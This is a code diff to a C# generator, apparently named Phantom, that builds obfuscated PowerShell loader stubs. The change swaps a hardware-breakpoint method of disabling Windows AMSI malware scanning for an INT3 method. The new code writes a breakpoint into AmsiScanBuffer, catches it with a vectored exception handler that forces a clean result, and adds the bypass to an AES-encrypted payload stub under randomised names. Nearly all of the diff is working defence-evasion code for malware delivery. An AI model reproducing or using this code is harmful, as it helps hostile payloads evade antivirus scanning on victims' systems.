@@ -8,19 +8,19 @@ namespace Phantom
 {
     internal class StubGen
     {
-        private static string GetHWBPCode(Random rng)
+        private static string GetINT3Code(Random rng)
         {
-            string hwbpClassName = RandomString(20, rng);
+            string className = RandomString(20, rng);
             string initMethod = RandomString(20, rng);
             string delField = RandomString(10, rng);
             string addrField = RandomString(10, rng);
+            string origField = RandomString(10, rng);
 
             return $@"
-$hwbp = @'
+$int3 = @'
 using System;
-using System.Reflection;
 using System.Runtime.InteropServices;
-public class {hwbpClassName}
+public class {className}
 {{
     [DllImport(""kernel32.dll"")]
     static extern IntPtr GetModuleHandle(string n);
@@ -29,54 +29,60 @@ public class {hwbpClassName}
     [DllImport(""kernel32.dll"")]
     static extern IntPtr AddVectoredExceptionHandler(uint f, IntPtr h);
     [DllImport(""kernel32.dll"")]
-    static extern IntPtr GetCurrentThread();
-    [DllImport(""kernel32.dll"")]
-    static extern bool GetThreadContext(IntPtr t, byte[] c);
-    [DllImport(""kernel32.dll"")]
-    static extern bool SetThreadContext(IntPtr t, byte[] c);
-    delegate long CB(IntPtr p);
-    static long _{addrField};
-    static CB _{delField};
-    static long H(IntPtr p)
+    static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint o);
+    const uint PAGE_EXECUTE_READWRITE = 0x40;
+    const uint EXCEPTION_BREAKPOINT = 0x80000003;
+    static IntPtr _{addrField};
+    static byte _{origField};
+    static {delField} _{delField};
+    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+    delegate uint {delField}(ref EXCEPTION_POINTERS ep);
+    [StructLayout(LayoutKind.Sequential)]
+    struct EXCEPTION_POINTERS
     {{
-        try {{
-            IntPtr r = Marshal.ReadIntPtr(p);
-            IntPtr x = Marshal.ReadIntPtr(p, IntPtr.Size);
-            if ((uint)Marshal.ReadInt32(r) != 0x80000004) return 0;
-            long rip = Marshal.ReadInt64(x, 0xF8);
-            if (rip != _{addrField}) return 0;
-            Marshal.WriteInt64(x, 0x78, 0);
-            long sp = Marshal.ReadInt64(x, 0x98);
-            Marshal.WriteInt64(x, 0xF8, Marshal.ReadInt64((IntPtr)sp));
-            Marshal.WriteInt64(x, 0x98, sp + 8);
-            long rp = Marshal.ReadInt64((IntPtr)(sp + 0x28));
-            Marshal.WriteInt64((IntPtr)rp, 0);
-            return -1;
-        }} catch {{ return 0; }}
+        public IntPtr ExceptionRecord;
+        public IntPtr ContextRecord;
+    }}
+    static uint Handler(ref EXCEPTION_POINTERS ep)
+    {{
+        if (_{addrField} == IntPtr.Zero) return 0;
+        uint code = (uint)Marshal.ReadInt32(ep.ExceptionRecord);
+        if (code != EXCEPTION_BREAKPOINT) return 0;
+        IntPtr ctx = ep.ContextRecord;
+        long ip = Marshal.ReadInt64(ctx, 0xF8);
+        if (ip != _{addrField}.ToInt64()) return 0;
+        uint old;
+        VirtualProtect(_{addrField}, (UIntPtr)1, PAGE_EXECUTE_READWRITE, out old);
+        Marshal.WriteByte(_{addrField}, _{origField});
+        VirtualProtect(_{addrField}, (UIntPtr)1, old, out old);
+        long sp = Marshal.ReadInt64(ctx, 0x98);
+        long rp = Marshal.ReadInt64((IntPtr)(sp + 0x30));
+        if (rp != 0) Marshal.WriteInt32((IntPtr)rp, 0);
+        long retAddr = Marshal.ReadInt64((IntPtr)sp);
+        Marshal.WriteInt64(ctx, 0x78, 0);
+        Marshal.WriteInt64(ctx, 0xF8, retAddr);
+        Marshal.WriteInt64(ctx, 0x98, sp + 8);
+        return unchecked((uint)-1);
     }}
     public static void {initMethod}()
     {{
-        string d = new string(new char[] {{ (char)97, (char)109, (char)115, (char)105, (char)46, (char)100, (char)108, (char)108 }});
-        string f = new string(new char[] {{ (char)65, (char)109, (char)115, (char)105, (char)83, (char)99, (char)97, (char)110, (char)66, (char)117, (char)102, (char)102, (char)101, (char)114 }});
-        IntPtr h = GetModuleHandle(d);
+        IntPtr h = GetModuleHandle(""amsi.dll"");
         if (h == IntPtr.Zero) return;
-        IntPtr a = GetProcAddress(h, f);
+        IntPtr a = GetProcAddress(h, ""AmsiScanBuffer"");
         if (a == IntPtr.Zero) return;
-        _{addrField} = a.ToInt64();
-        byte[] c = new byte[1232];
-        BitConverter.GetBytes((uint)0x0010001B).CopyTo(c, 0x30);
-        GetThreadContext(GetCurrentThread(), c);
-        BitConverter.GetBytes(_{addrField}).CopyTo(c, 0x48);
-        ulong d7 = BitConverter.ToUInt64(c, 0x70) | 1;
-        BitConverter.GetBytes(d7).CopyTo(c, 0x70);
-        SetThreadContext(GetCurrentThread(), c);
-        _{delField} = new CB(H);
+        _{addrField} = a;
+        uint old;
+        VirtualProtect(a, (UIntPtr)1, PAGE_EXECUTE_READWRITE, out old);
+        _{origField} = Marshal.ReadByte(a);
+        Marshal.WriteByte(a, 0xCC);
+        VirtualProtect(a, (UIntPtr)1, old, out old);
+        _{delField} = new {delField}(Handler);
         AddVectoredExceptionHandler(1, Marshal.GetFunctionPointerForDelegate(_{delField}));
     }}
 }}
 '@;
-Add-Type -TypeDefinition $hwbp;
-[{hwbpClassName}]::{initMethod}();
+Add-Type -TypeDefinition $int3;
+[{className}]::{initMethod}();
 ";
         }
 
@@ -97,6 +103,7 @@ Add-Type -TypeDefinition $hwbp;
             string obfStep2Var = RandomString(5, rng);
             string obfTmpVar = RandomString(5, rng);
 
+            stubcode += GetINT3Code(rng);
             stubcode += GetEmbeddedString(@"Phantom.Resources.AESStub.ps1");
 
             stubcode = stubcode.Replace(@"DECRYPTION_KEY", decryptionKey)
